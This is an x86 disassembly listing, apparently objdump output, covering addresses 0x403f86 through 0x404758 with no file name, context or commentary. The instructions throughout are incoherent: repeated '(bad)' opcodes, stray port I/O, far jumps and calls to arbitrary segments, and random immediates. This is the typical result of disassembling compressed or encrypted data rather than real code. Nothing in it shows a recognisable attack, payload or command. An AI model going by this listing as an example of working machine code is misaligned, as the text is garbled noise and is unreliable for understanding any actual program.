  403f86:	adc    BYTE PTR es:[edx],ch
  403f89:	jg     0x403fd4
  403f8b:	ja     0x403f30
  403f8d:	push   ebp
  403f8e:	ins    BYTE PTR es:[edi],dx
  403f8f:	(bad)  
  403f90:	xchg   ebp,eax
  403f91:	cs xlat BYTE PTR fs:[ebx]
  403f94:	arpl   WORD PTR [edx],bx
  403f96:	lahf   
  403f97:	fistp  WORD PTR [edi+0x10205b38]
  403f9d:	mov    eax,0x3d37246b
  403fa2:	ror    BYTE PTR [ebx+0x4666be22],0x3a
  403fa9:	bound  ebp,QWORD PTR [ebp+0x15a6ac2f]
  403faf:	jmp    0x9dcd:0xd7d1d7b9
  403fb6:	mov    eax,DWORD PTR [edi-0x57329df0]
  403fbc:	mov    bl,0xcb
  403fbe:	inc    ecx
  403fbf:	mov    esi,edi
  403fc1:	scas   eax,DWORD PTR es:[edi]
  403fc2:	adc    BYTE PTR [edx-0x657a0d42],0x11
  403fc9:	lods   al,BYTE PTR ds:[esi]
  403fca:	push   0x490f2e2d
  403fcf:	scas   al,BYTE PTR es:[edi]
  403fd0:	mov    ebp,0xa16c65e1
  403fd5:	and    DWORD PTR [eax+0x6545683e],0xbdb32882
  403fdf:	xor    al,0xf6
  403fe1:	outs   dx,DWORD PTR ds:[si]
  403fe3:	jbe    0x403fb9
  403fe5:	call   0x2f21:0x93c1a5fd
  403fec:	adc    al,0xc7
  403fee:	adc    DWORD PTR [ecx+0x12bd067a],edx
  403ff4:	les    edx,FWORD PTR [ecx]
  403ff6:	cmp    ebp,ebp
  403ff8:	inc    esi
  403ff9:	or     ebx,DWORD PTR [edi+edi*2+0x30a651c9]
  404000:	sar    DWORD PTR [esi-0x284f5cd5],0x60
  404007:	inc    ecx
  404008:	inc    esi
  404009:	mov    esi,0x75c610a8
  40400e:	mov    ds:0x8d847789,al
  404013:	inc    esp
  404014:	dec    ebx
  404015:	mov    BYTE PTR [ebx-0x42],cl
  404018:	pop    ecx
  404019:	iret   
  40401a:	lods   eax,DWORD PTR ds:[esi]
  40401b:	in     eax,dx
  40401c:	jmp    0x889049b9
  404021:	mov    al,0x99
  404023:	cmp    esi,edi
  404025:	ins    DWORD PTR es:[edi],dx
  404026:	add    al,0x23
  404028:	cmp    DWORD PTR [ecx+edi*4-0x3a],ecx
  40402c:	icebp  
  40402d:	fld    DWORD PTR [ebp-0x2f]
  404030:	enter  0x7ac7,0x16
  404034:	stos   BYTE PTR es:[edi],al
  404035:	jecxz  0x403fee
  404037:	in     al,0x88
  404039:	sub    eax,0x9bc1d2b6
  40403e:	and    al,dl
  404040:	pusha  
  404041:	push   ds
  404042:	leave  
  404043:	sub    DWORD PTR [ecx],ebp
  404045:	retf   
  404046:	dec    ebp
  404047:	pop    edi
  404048:	in     al,0xf5
  40404a:	ficomp WORD PTR [edx+ebp*4+0x14b5963c]
  404051:	xchg   esi,eax
  404052:	and    al,0x61
  404054:	adc    DWORD PTR [ebx],ebp
  404056:	retf   
  404057:	inc    esp
  404058:	sti    
  404059:	lock inc esp
  40405b:	ret    
  40405c:	jp     0x40401f
  40405e:	fnstcw WORD PTR [ebp+0x1088e7fa]
  404064:	dec    ecx
  404065:	lods   eax,DWORD PTR ds:[esi]
  404066:	fsub   st,st(1)
  404068:	mov    esi,0xf80171c3
  40406d:	adc    eax,0xb3e7a4a1
  404072:	mov    bh,bh
  404074:	cmp    BYTE PTR [eax+ecx*8+0x1],dh
  404078:	sbb    eax,0xb93a1483
  40407d:	mov    BYTE PTR [ecx+0x2d],dh
  404080:	fwait
  404081:	enter  0xe07,0x40
  404085:	retf   
  404086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404087:	mov    eax,ds:0xd5229ff1
  40408c:	jp     0x404098
  40408e:	xchg   esp,eax
  40408f:	aas    
  404090:	aad    0x1e
  404092:	jmp    0x4a5:0xd778f49c
  404099:	and    ecx,eax
  40409b:	lahf   
  40409c:	or     al,0x6f
  40409e:	inc    edi
  40409f:	(bad)  [ebp-0x49]
  4040a2:	fcmovb st,st(5)
  4040a4:	dec    edx
  4040a5:	add    BYTE PTR [esi+0x58],ch
  4040a8:	mov    ah,0xe6
  4040aa:	fnstcw WORD PTR [esi+0x0]
  4040ad:	mov    BYTE PTR [ebp-0x79],dh
  4040b0:	mov    ah,0xc4
  4040b2:	push   ecx
  4040b3:	mov    ah,0x24
  4040b5:	or     al,0x4
  4040b7:	cmp    al,0x2f
  4040b9:	jge    0x4040e7
  4040bb:	scas   eax,DWORD PTR es:[edi]
  4040bc:	mov    ah,BYTE PTR [eax]
  4040be:	adc    eax,0x2c4d2646
  4040c3:	xor    ebp,DWORD PTR [ebx-0x532d69c]
  4040c9:	add    dh,ch
  4040cb:	aaa    
  4040cc:	lods   al,BYTE PTR ds:[esi]
  4040cd:	pop    edx
  4040ce:	push   ds
  4040cf:	mov    dh,0xcc
  4040d1:	jp     0x4040a6
  4040d3:	loope  0x40414f
  4040d5:	vpunpcklqdq ymm7,ymm3,YMMWORD PTR [ecx+0xe4916a7]
  4040de:	jge    0x404105
  4040e0:	cdq    
  4040e1:	std    
  4040e2:	(bad)  
  4040e3:	(bad)  [ebx-0x3b]
  4040e6:	adc    ah,BYTE PTR [eax+0x2f]
  4040e9:	or     eax,0xd16dbe95
  4040ee:	lea    ebp,[edx+0x72f74d02]
  4040f4:	xchg   ecx,eax
  4040f5:	mov    al,0xd7
  4040f7:	les    edx,FWORD PTR [bx-0x6]
  4040fb:	mov    ds:0xabe63802,eax
  404100:	stos   DWORD PTR es:[edi],eax
  404101:	mov    dh,0xe3
  404103:	mov    bh,BYTE PTR [ebp+0x54fc84e9]
  404109:	stos   DWORD PTR es:[edi],eax
  40410a:	xchg   ebx,eax
  40410b:	in     al,dx
  40410c:	sub    ebx,DWORD PTR [edx-0x74]
  40410f:	into   
  404110:	stc    
  404111:	test   DWORD PTR [eax+0x60ac8ebe],eax
  404117:	rcl    DWORD PTR [ecx+edx*2-0x6f94ccd1],0xf9
  40411f:	pop    esi
  404120:	and    al,0x52
  404122:	pushf  
  404123:	mov    BYTE PTR [ebx+ecx*8-0x3e6cbf37],dh
  40412a:	bound  ecx,QWORD PTR [eax]
  40412c:	sar    DWORD PTR ds:0x84f470bc,cl
  404132:	xchg   esi,eax
  404133:	sbb    DWORD PTR [ebx+ecx*2+0x7a38c68e],ebx
  40413a:	rcl    ebx,0x98
  40413d:	arpl   WORD PTR [ecx],sp
  40413f:	lds    edi,FWORD PTR [eax-0x1e]
  404142:	mov    eax,0x6a2caae3
  404147:	push   edx
  404148:	xor    eax,0x5b0adad8
  40414d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40414e:	pusha  
  40414f:	inc    edi
  404150:	xchg   ebx,eax
  404151:	(bad)  
  404152:	push   ebp
  404153:	xor    ah,BYTE PTR [eax+0x54]
  404156:	cmp    ebx,edi
  404158:	or     DWORD PTR [edi+0x4a],esi
  40415b:	push   eax
  40415c:	push   ebx
  40415d:	pop    ss
  40415e:	(bad)  
  404160:	add    edx,eax
  404162:	xor    DWORD PTR [eax+0x8],esp
  404165:	btr    DWORD PTR [edi-0x43f4d631],esi
  40416c:	in     al,0x41
  40416e:	pop    edi
  40416f:	sahf   
  404170:	mov    ecx,0xd077fdfd
  404175:	loope  0x404118
  404177:	dec    ebx
  404178:	xor    BYTE PTR [esi],cl
  40417a:	adc    cl,bh
  40417c:	cwde   
  40417d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40417e:	xchg   ebp,eax
  40417f:	jecxz  0x404141
  404181:	add    DWORD PTR [ebx],esp
  404183:	data16 in al,dx
  404185:	out    dx,eax
  404186:	mov    ebp,0xaa5c9fcf
  40418b:	test   eax,0xf1e56a11
  404190:	in     eax,dx
  404191:	ins    DWORD PTR es:[edi],dx
  404192:	mov    BYTE PTR [edx],al
  404194:	dec    eax
  404195:	pop    es
  404196:	mov    bh,0x35
  404198:	dec    eax
  404199:	out    0x9d,eax
  40419b:	aam    0x66
  40419d:	daa    
  40419e:	pop    es
  40419f:	sbb    eax,0x3acfeded
  4041a4:	in     al,dx
  4041a5:	xchg   edi,eax
  4041a6:	mov    esp,0xf63ac27d
  4041ab:	aad    0xc2
  4041ad:	mov    edi,0x451e3af5
  4041b2:	cmp    dl,bl
  4041b4:	xor    DWORD PTR [edi],esp
  4041b6:	shl    DWORD PTR [ebp-0x65],1
  4041b9:	xchg   edi,eax
  4041ba:	iret   
  4041bb:	push   ecx
  4041bc:	ja     0x4041ff
  4041be:	sbb    al,BYTE PTR [ebx-0x3b]
  4041c1:	push   ds
  4041c2:	mov    al,0xc5
  4041c4:	lods   al,BYTE PTR ds:[esi]
  4041c5:	into   
  4041c6:	(bad)  
  4041c7:	retf   
  4041c8:	inc    dl
  4041ca:	mov    dl,0xa4
  4041cc:	rol    bl,1
  4041ce:	mov    ds:0xf424e0fa,eax
  4041d3:	pop    edi
  4041d4:	xor    eax,0xa94dd50e
  4041d9:	push   ebx
  4041da:	outs   dx,BYTE PTR ds:[esi]
  4041db:	lock cmp al,0x1a
  4041de:	imul   ebp,DWORD PTR [edx-0x16],0xd805d47a
  4041e5:	push   cs
  4041e6:	jle    0x404188
  4041e8:	test   ebp,esi
  4041ea:	js     0x404248
  4041ec:	shl    BYTE PTR [esp+edx*2-0x13],cl
  4041f0:	mov    ch,0xde
  4041f2:	mov    bh,0xf3
  4041f4:	in     al,0xea
  4041f6:	shl    ch,1
  4041f8:	outs   dx,DWORD PTR fs:[esi]
  4041fa:	sbb    dl,0x8e
  4041fd:	in     eax,0xd5
  4041ff:	test   edx,0xd7cfb9b7
  404205:	popa   
  404206:	pop    es
  404207:	jp     0x40419f
  404209:	mov    esi,0x69f2834a
  40420e:	daa    
  40420f:	xchg   ah,al
  404211:	cwde   
  404212:	push   cs
  404213:	jne    0x404287
  404215:	mov    BYTE PTR [ebp-0x5494fbf0],bl
  40421b:	sub    DWORD PTR [ebx],edi
  40421d:	add    ah,BYTE PTR [edx]
  40421f:	add    BYTE PTR [ebx],dl
  404221:	lods   eax,DWORD PTR ds:[esi]
  404222:	and    edi,DWORD PTR [edi+edi*1-0x12]
  404226:	xchg   esp,eax
  404227:	pop    eax
  404228:	cmp    BYTE PTR [ebp-0x61acf2cf],ch
  40422e:	sub    bh,BYTE PTR ds:0xe6e52dba
  404234:	cld    
  404235:	mov    al,0xf2
  404237:	sbb    eax,0x4bc2284e
  40423c:	pop    edx
  40423d:	call   0xfe33:0x7c37ce9a
  404244:	xor    ebp,DWORD PTR [esi+eax*8]
  404247:	push   edx
  404248:	adc    DWORD PTR [eiz*4+0x77f56969],ecx
  40424f:	inc    ebx
  404250:	mov    bh,0x74
  404252:	sbb    ecx,ebx
  404254:	jmp    0x4042b2
  404256:	jnp    0x40421f
  404258:	lods   al,BYTE PTR ds:[si]
  40425a:	and    al,0x97
  40425c:	stos   BYTE PTR es:[edi],al
  40425d:	pop    es
  40425e:	test   BYTE PTR [esi],al
  404260:	in     al,0x8c
  404262:	or     DWORD PTR [eax+0x7108d4f1],eax
  404268:	int    0xa
  40426a:	icebp  
  40426b:	lods   al,BYTE PTR ds:[esi]
  40426c:	cmp    BYTE PTR [ecx+0x3230bd08],al
  404272:	lds    esi,FWORD PTR [eax-0x2446a303]
  404278:	mov    ah,0xc
  40427a:	inc    eax
  40427b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40427c:	fidivr WORD PTR ds:0xe7dff9ff
  404282:	dec    edi
  404283:	hlt    
  404284:	jno    0x4042fe
  404286:	cmc    
  404287:	or     esi,esp
  404289:	mov    al,ds:0x309cce14
  40428e:	jns    0x404268
  404290:	mov    eax,ds:0xdac239c7
  404295:	pslld  mm4,QWORD PTR [ebp+ebp*4-0x29]
  40429a:	xchg   esi,eax
  40429b:	xor    BYTE PTR [ecx+0x41],cl
  40429e:	add    DWORD PTR [edi-0x50c84667],0xffffffee
  4042a5:	adc    al,BYTE PTR [ebx-0x5d]
  4042a8:	retf   0x4aee
  4042ab:	stc    
  4042ac:	mov    ecx,0x41cf18fc
  4042b1:	daa    
  4042b2:	mov    dh,ch
  4042b4:	cmp    eax,0x61b5533d
  4042b9:	(bad)  
  4042ba:	call   0x705c7e2e
  4042bf:	mov    DWORD PTR [edi+0x74],esp
  4042c2:	mov    WORD PTR [eax],?
  4042c4:	out    dx,al
  4042c5:	cdq    
  4042c6:	inc    edi
  4042c7:	sub    al,0xea
  4042c9:	push   edi
  4042ca:	push   esp
  4042cb:	neg    DWORD PTR [edx-0x4ef36b6d]
  4042d1:	sub    DWORD PTR [ebx-0x77f2081a],edi
  4042d7:	ret    0x816
  4042da:	fst    QWORD PTR [eax]
  4042dc:	push   0x9b6ebfcb
  4042e1:	mov    esi,0xd12238b
  4042e6:	mov    dh,0x54
  4042e8:	mov    ecx,0x38da02ac
  4042ed:	imul   esp,DWORD PTR [ebx-0x6b8c419b],0xbc40d4d0
  4042f7:	sub    eax,edx
  4042f9:	frstor [esp+ebx*4]
  4042fc:	cwde   
  4042fd:	aaa    
  4042fe:	push   ecx
  4042ff:	sub    esi,DWORD PTR [ecx-0x4b43dc2d]
  404305:	jb     0x4042d8
  404307:	mov    bh,0x24
  40430a:	pop    ebx
  40430b:	mov    edx,0xa5429066
  404310:	(bad)  
  404311:	arpl   WORD PTR [esi+0x3f],di
  404314:	mov    ah,0xfa
  404316:	mov    ch,0x63
  404318:	call   0xdf678cf4
  40431d:	lea    eax,[edx]
  40431f:	mov    bl,ch
  404321:	bound  ebp,QWORD PTR [ecx]
  404323:	jmp    0xd011:0x6db9e622
  40432a:	jbe    0x40430e
  40432c:	jno    0x404314
  40432e:	je     0x40435b
  404330:	inc    eax
  404331:	add    al,0x7d
  404333:	(bad)  
  404334:	and    eax,0xc64a91a1
  404339:	sub    BYTE PTR [edx+0x73af7613],bl
  40433f:	(bad)  
  404341:	sbb    BYTE PTR [edx+eax*2+0x2e60439],ah
  404348:	pop    es
  404349:	imul   edx,DWORD PTR es:[edx+0x7f4dc577],0x7886bfa5
  404354:	push   ecx
  404355:	lock (bad) 
  404357:	fild   WORD PTR [eax+0x7ee4fdc0]
  40435d:	test   al,0xa8
  40435f:	xchg   ebx,eax
  404360:	sub    DWORD PTR [esi],0xffffffc3
  404363:	adc    eax,0xac5c233c
  404368:	(bad)  
  404369:	lods   al,BYTE PTR ds:[esi]
  40436a:	ins    BYTE PTR es:[edi],dx
  40436b:	inc    ebp
  40436c:	iret   
  40436d:	push   ebx
  40436e:	into   
  40436f:	pop    ebx
  404370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404371:	rol    BYTE PTR [edi+0x76f2bfd6],1
  404377:	es aaa 
  404379:	les    ebp,FWORD PTR [edx+0x6a15c699]
  40437f:	and    DWORD PTR [edx],eax
  404381:	iret   
  404382:	push   cs
  404383:	mov    cl,0x82
  404385:	mov    esi,0xcd51b09
  40438a:	jg     0x4043fc
  40438c:	fcmovbe st,st(0)
  40438e:	sti    
  40438f:	jbe    0x404313
  404391:	cs js  0x40438b
  404394:	mov    eax,ds:0x747efdcd
  404399:	mov    ds:0x7cbc0387,al
  40439e:	xchg   edx,edx
  4043a0:	mov    edx,0xe4349fe7
  4043a5:	cld    
  4043a6:	pop    esi
  4043a7:	cmp    eax,0x83b0067b
  4043ac:	imul   eax,DWORD PTR [edx-0x4c],0xffffffa5
  4043b0:	and    ecx,DWORD PTR [eax]
  4043b2:	dec    ebp
  4043b3:	lahf   
  4043b4:	retf   0x4cc4
  4043b7:	dec    ebx
  4043b8:	(bad)  
  4043ba:	fisubr WORD PTR [ebx-0x4a90aa57]
  4043c0:	adc    ecx,DWORD PTR [ebp+0x228e0448]
  4043c6:	dec    bx
  4043c8:	sbb    eax,0x9a963407
  4043cd:	pop    es
  4043ce:	(bad)  
  4043cf:	push   0xffffffda
  4043d1:	xchg   ebp,eax
  4043d2:	push   es
  4043d3:	jbe    0x4043ba
  4043d5:	push   ecx
  4043d6:	mov    esp,0xbcc31a54
  4043db:	in     eax,dx
  4043dc:	pop    ebx
  4043dd:	ror    BYTE PTR [ecx+0x2baecb56],0xaf
  4043e4:	pop    ebx
  4043e5:	xor    bh,BYTE PTR [edx+0x13]
  4043e8:	shl    BYTE PTR [edx],cl
  4043ea:	and    DWORD PTR [edx],ebx
  4043ec:	and    eax,0xd4b45bba
  4043f1:	leave  
  4043f2:	mov    bh,BYTE PTR [edi+0x11243dab]
  4043f8:	scas   al,BYTE PTR es:[edi]
  4043f9:	jle    0x40441e
  4043fb:	add    BYTE PTR [ebx-0x3],0xfb
  4043ff:	out    0x9c,al
  404401:	je     0x4043e0
  404403:	jg     0x404441
  404405:	mov    esp,0x4c6bf098
  40440a:	es dec eax
  40440c:	inc    edi
  40440d:	xor    DWORD PTR ds:0x6fbb0234,0x4980cd90
  404417:	addr16 pop ebp
  404419:	mov    al,0x1c
  40441b:	scas   eax,DWORD PTR es:[edi]
  40441c:	mov    cl,0xca
  40441e:	jo     0x404400
  404420:	scas   al,BYTE PTR es:[edi]
  404421:	sti    
  404422:	in     al,0x92
  404424:	es jnp 0x404490
  404427:	int    0xb7
  404429:	inc    esp
  40442a:	cdq    
  40442b:	push   ebx
  40442c:	(bad)  
  40442d:	mov    ecx,0xcbc6d2e0
  404432:	push   es
  404433:	push   0x3c
  404435:	xchg   esi,eax
  404436:	call   0xed6a4bcd
  40443b:	sub    dh,BYTE PTR [ecx+ecx*4-0x1a]
  40443f:	cdq    
  404440:	xchg   ecx,eax
  404441:	shl    esp,0x8e
  404444:	loop   0x404479
  404446:	stos   DWORD PTR es:[edi],eax
  404447:	xor    BYTE PTR [ecx],0xdb
  40444a:	dec    ebp
  40444b:	(bad)  
  40444c:	into   
  40444d:	rol    BYTE PTR [edi],cl
  40444f:	cli    
  404450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404451:	jbe    0x4043d8
  404453:	pop    ebx
  404454:	adc    esp,0xffffffa1
  404457:	mov    cl,0xd7
  404459:	clc    
  40445a:	dec    esi
  40445b:	popa   
  40445c:	ja     0x4044ad
  40445e:	pop    ss
  40445f:	xchg   edx,eax
  404460:	daa    
  404461:	lock fnstsw WORD PTR [ebp*4+0x3b796903]
  404469:	push   cs
  40446a:	pop    esp
  40446b:	cwde   
  40446c:	xchg   DWORD PTR [edx],ebp
  40446e:	fsubr  DWORD PTR [ecx]
  404470:	push   edx
  404471:	fld    DWORD PTR [edx]
  404473:	pop    ebx
  404474:	xchg   ecx,eax
  404475:	pop    eax
  404476:	push   cs
  404477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404478:	jmp    0x3d27:0xc7cae189
  40447f:	jbe    0x40441c
  404481:	and    ch,bh
  404483:	popf   
  404484:	push   ss
  404485:	lds    esp,FWORD PTR [eax-0x2e8a475f]
  40448b:	ret    0x80c
  40448e:	mov    esi,0x4f933d38
  404493:	or     BYTE PTR [ebp-0x27],bh
  404496:	into   
  404497:	or     eax,0xc877a285
  40449c:	or     BYTE PTR [ebp+0x35],bh
  40449f:	push   es
  4044a0:	adc    al,0x52
  4044a2:	aaa    
  4044a3:	inc    ecx
  4044a4:	dec    BYTE PTR [edx-0xa02013a]
  4044aa:	fsub   DWORD PTR [ebx+edx*4-0x2a]
  4044ae:	mov    bl,0xae
  4044b0:	jecxz  0x404507
  4044b2:	mov    cl,0xdb
  4044b4:	jp     0x4044bf
  4044b6:	xor    edi,DWORD PTR [ebp+0x2e]
  4044b9:	adc    eax,0x70358258
  4044be:	xor    BYTE PTR [edi+0x43],al
  4044c1:	aam    0xf0
  4044c3:	and    eax,0xa202fbad
  4044c8:	add    ebx,esp
  4044ca:	ins    BYTE PTR es:[edi],dx
  4044cb:	pop    edx
  4044cc:	imul   edi,DWORD PTR [esi+0x79ae6385],0xffffffaf
  4044d3:	adc    al,0x60
  4044d5:	neg    BYTE PTR [ecx]
  4044d7:	push   esi
  4044d8:	mov    cl,0x14
  4044da:	in     al,0xeb
  4044dc:	lods   eax,DWORD PTR ds:[esi]
  4044dd:	dec    edi
  4044de:	fimul  DWORD PTR [ebx-0x3b]
  4044e1:	pop    esp
  4044e2:	(bad)  
  4044e4:	xchg   edx,eax
  4044e5:	outs   dx,BYTE PTR ds:[esi]
  4044e6:	add    al,0xd
  4044e8:	xlat   BYTE PTR ds:[ebx]
  4044e9:	stos   DWORD PTR es:[edi],eax
  4044ea:	imul   ecx,esi,0x1a
  4044ed:	ins    BYTE PTR es:[edi],dx
  4044ee:	adc    al,0xed
  4044f0:	(bad)  
  4044f1:	lods   eax,DWORD PTR gs:[esi]
  4044f3:	pop    esi
  4044f4:	retf   0x9687
  4044f7:	dec    edi
  4044f8:	mov    ecx,0x3a6d4fff
  4044fd:	xchg   ebp,eax
  4044fe:	in     al,dx
  4044ff:	dec    esp
  404500:	push   edx
  404501:	jg     0x404526
  404503:	jle    0x4044da
  404505:	js     0x40448d
  404507:	xchg   DWORD PTR [ebx+0x4f9bead4],edi
  40450d:	and    al,0x4e
  40450f:	mov    cs,WORD PTR [edi+edx*1+0x53]
  404513:	xchg   esi,eax
  404514:	pop    esp
  404515:	push   es
  404516:	ret    
  404517:	dec    esp
  404518:	or     dh,BYTE PTR [ebp+0x7d71531d]
  40451e:	(bad)  
  40451f:	outs   dx,BYTE PTR ds:[esi]
  404520:	mov    bl,0x39
  404522:	jnp    0x404597
  404524:	outs   dx,BYTE PTR ds:[esi]
  404525:	dec    edi
  404526:	push   edx
  404527:	bound  esi,QWORD PTR [esi-0x4675aa1a]
  40452d:	ret    0xe576
  404530:	fistp  QWORD PTR [ebp-0x30]
  404533:	sub    al,0xe1
  404535:	cmc    
  404536:	retf   0x87a6
  404539:	xchg   esp,eax
  40453a:	adc    al,0xcc
  40453c:	mov    al,ds:0x99c7a139
  404541:	sbb    cl,BYTE PTR [ebx-0x5b]
  404544:	out    dx,al
  404545:	jp     0x404549
  404547:	ror    DWORD PTR [eax+0x32],cl
  40454a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454b:	dec    ecx
  40454c:	mov    cl,0xb0
  40454e:	add    edi,edx
  404550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404551:	not    BYTE PTR [ebp-0xc315df6]
  404557:	lahf   
  404558:	call   0xcf64:0x31613e80
  40455f:	test   al,0xe5
  404561:	jmp    0xa8c8:0x3ec81ebd
  404568:	sbb    al,0x46
  40456a:	and    ebp,DWORD PTR [esi-0x37]
  40456d:	adc    ebp,ebx
  40456f:	jbe    0x40452a
  404571:	scas   eax,DWORD PTR es:[edi]
  404572:	or     eax,0xe082ce15
  404577:	xchg   ecx,eax
  404578:	rol    BYTE PTR [ebp+0x22],1
  40457b:	lock mov ebp,0xcf217c63
  404581:	or     dl,BYTE PTR [edi-0x20]
  404584:	jno    0x4045a2
  404586:	int    0x8
  404588:	test   eax,0x8627b0
  40458d:	sbb    edi,eax
  40458f:	test   eax,0x63226f09
  404594:	or     DWORD PTR [ebp-0x13],ebx
  404597:	xor    al,0xb
  404599:	sub    BYTE PTR [edx],bh
  40459b:	push   esi
  40459c:	and    BYTE PTR [ecx],bh
  40459e:	mov    BYTE PTR [edi-0x6b4cbd80],bl
  4045a4:	hlt    
  4045a5:	scas   eax,DWORD PTR es:[edi]
  4045a6:	ret    0x50f8
  4045a9:	dec    edx
  4045aa:	sahf   
  4045ab:	mov    dh,0x7e
  4045ad:	popf   
  4045ae:	pop    ss
  4045af:	xchg   edi,eax
  4045b0:	test   DWORD PTR [ebx+0x24],0x2012122e
  4045b7:	ror    ebp,cl
  4045b9:	xor    al,0x46
  4045bc:	or     BYTE PTR ds:0xc24e4123,dl
  4045c2:	xor    BYTE PTR [edx],ah
  4045c4:	cmp    BYTE PTR [ecx],al
  4045c6:	pop    es
  4045c7:	adc    al,0xc
  4045c9:	mov    ecx,0xaa56e8d6
  4045ce:	sub    ebx,DWORD PTR [esi+ebp*4-0x22147fc]
  4045d5:	into   
  4045d6:	mov    eax,ds:0xef38f482
  4045db:	jp     0x404626
  4045dd:	add    al,0x7e
  4045df:	mov    ah,0xa9
  4045e1:	aaa    
  4045e2:	je     0x404577
  4045e4:	aaa    
  4045e5:	test   ecx,0xca2d91c2
  4045eb:	fcmovnu st,st(2)
  4045ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ee:	cld    
  4045ef:	out    0xdd,al
  4045f1:	rcr    BYTE PTR [edx+0x6b],1
  4045f4:	dec    edx
  4045f5:	in     eax,dx
  4045f6:	out    dx,eax
  4045f7:	test   al,0x4a
  4045f9:	(bad)  
  4045fa:	dec    edi
  4045fb:	mov    ebx,0xda357e86
  404600:	leave  
  404601:	imul   ebp,esi,0x19
  404604:	jns    0x4045b0
  404606:	add    al,0x53
  404608:	ins    DWORD PTR es:[edi],dx
  404609:	jecxz  0x40464e
  40460b:	cmp    edi,DWORD PTR [ebx+0x46]
  40460e:	and    ecx,DWORD PTR [eax+esi*1+0x7ed9d4e5]
  404615:	int    0xc2
  404617:	stos   DWORD PTR es:[edi],eax
  404618:	xor    eax,0xe567707e
  40461d:	int    0x80
  40461f:	push   ss
  404620:	xor    bh,BYTE PTR [ecx]
  404622:	jb     0x40464f
  404624:	das    
  404625:	es add bl,dh
  404628:	jo     0x404619
  40462a:	cmp    dl,BYTE PTR [eax+eax*1]
  40462d:	jmp    FWORD PTR [esi]
  40462f:	push   ds
  404630:	repz or eax,eax
  404633:	lahf   
  404634:	adc    bl,cl
  404636:	fsubr  QWORD PTR [ebp-0x42]
  404639:	adc    dl,BYTE PTR [ebx-0x66]
  40463c:	cwde   
  40463d:	cmp    dh,BYTE PTR [edi+0x34]
  404640:	mov    eax,ds:0xd615c0f7
  404645:	add    edi,ebp
  404647:	jp     0x4045f4
  404649:	jns    0x404617
  40464b:	xchg   edx,eax
  40464c:	add    DWORD PTR [edi-0x51f07a9d],ebx
  404652:	push   edx
  404653:	in     eax,dx
  404654:	or     DWORD PTR [ebx],0xffffffba
  404657:	sbb    edx,DWORD PTR [edx-0x45]
  40465a:	test   DWORD PTR [esi-0x7f517699],ebx
  404660:	out    0xad,eax
  404662:	jns    0x404650
  404664:	data16 fcom DWORD PTR [eax+eax*1]
  404668:	test   BYTE PTR [edi-0x75],cl
  40466b:	pusha  
  40466c:	fdiv   QWORD PTR [eax-0x5dec904b]
  404672:	sbb    edi,esp
  404674:	sbb    eax,0x6ebc3345
  404679:	push   ds
  40467a:	imul   edi,DWORD PTR [eax-0x129e074],0x39
  404681:	pop    ebx
  404682:	(bad)  
  404683:	xor    ax,0xd59c
  404687:	int    0xb9
  404689:	or     DWORD PTR [ecx-0x2a],ebx
  40468c:	retf   0xd118
  40468f:	mov    ebp,0x8d8b2599
  404694:	inc    eax
  404695:	test   DWORD PTR [ecx],ebp
  404697:	mov    bl,0x57
  404699:	cs leave 
  40469b:	mov    DWORD PTR [ebx],edi
  40469d:	sbb    ebx,DWORD PTR [eax+0x7b]
  4046a0:	adc    BYTE PTR ds:0x37ad9a04,0xea
  4046a7:	add    BYTE PTR [edx-0x7b1a662e],bl
  4046ad:	out    dx,al
  4046ae:	rol    BYTE PTR [ebx-0x5d],cl
  4046b1:	and    cl,BYTE PTR [ecx-0x65]
  4046b4:	cmp    DWORD PTR [ebp-0x66],ecx
  4046b7:	and    BYTE PTR [eax+0x20],bh
  4046ba:	popf   
  4046bb:	sub    eax,0x18a48deb
  4046c0:	ret    0x2643
  4046c3:	xchg   DWORD PTR [ebp+0x23],ecx
  4046c6:	fnstsw WORD PTR [edx+0x7c5d9f3c]
  4046cc:	int    0x2d
  4046ce:	in     eax,dx
  4046cf:	dec    ecx
  4046d0:	mov    ds:0x73ea9bf5,al
  4046d5:	ds jbe 0x40468e
  4046d8:	fcomp  QWORD PTR [edx]
  4046da:	cld    
  4046db:	push   edi
  4046dc:	fwait
  4046dd:	gs je  0x404687
  4046e0:	jnp    0x404753
  4046e2:	call   0x8a8a:0xf1684746
  4046e9:	xchg   ebp,ebx
  4046eb:	scas   eax,DWORD PTR es:[edi]
  4046ec:	(bad)  
  4046ed:	xchg   edx,eax
  4046ee:	dec    edi
  4046ef:	arpl   WORD PTR [ebx],bp
  4046f1:	or     DWORD PTR [eax],ebp
  4046f3:	sub    eax,0x7a4b3c48
  4046f8:	add    dh,BYTE PTR [esi-0x3d]
  4046fb:	adc    edx,DWORD PTR [edi+0x2]
  4046fe:	push   ebx
  4046ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404700:	in     al,0xc4
  404702:	ret    0x6a12
  404705:	push   ds
  404706:	push   edi
  404707:	test   DWORD PTR [ebx+eiz*8-0x68],edi
  40470b:	xor    ebx,eax
  40470d:	lahf   
  40470e:	jle    0x4046f2
  404710:	mov    ds:0x392d73f7,al
  404715:	cdq    
  404716:	in     al,0xe1
  404718:	and    eax,DWORD PTR [eax-0x43]
  40471b:	call   0xc16c:0xd9a9a141
  404722:	std    
  404723:	fdiv   DWORD PTR [edx-0x7]
  404726:	mov    eax,0x34899390
  40472b:	mov    ds:0xe87277ac,al
  404730:	jp     0x4046bf
  404732:	push   edi
  404733:	in     al,0x8e
  404735:	ret    
  404736:	adc    al,0x1d
  404738:	jmp    0x8dbe:0x30147bd2
  40473f:	mov    esp,0x27caf097
  404744:	popa   
  404745:	(bad)  
  404746:	dec    ebx
  404747:	pop    ecx
  404748:	xchg   ebp,eax
  404749:	js     0x404734
  40474b:	sti    
  40474c:	loope  0x4046f9
  40474e:	mov    WORD PTR [eax+0x78],?
  404751:	adc    dl,BYTE PTR [edx-0x72]
  404754:	and    BYTE PTR cs:[ecx],dh
  404757:	xlat   BYTE PTR ds:[ebx]
  404758:	fadd   st,st(7)
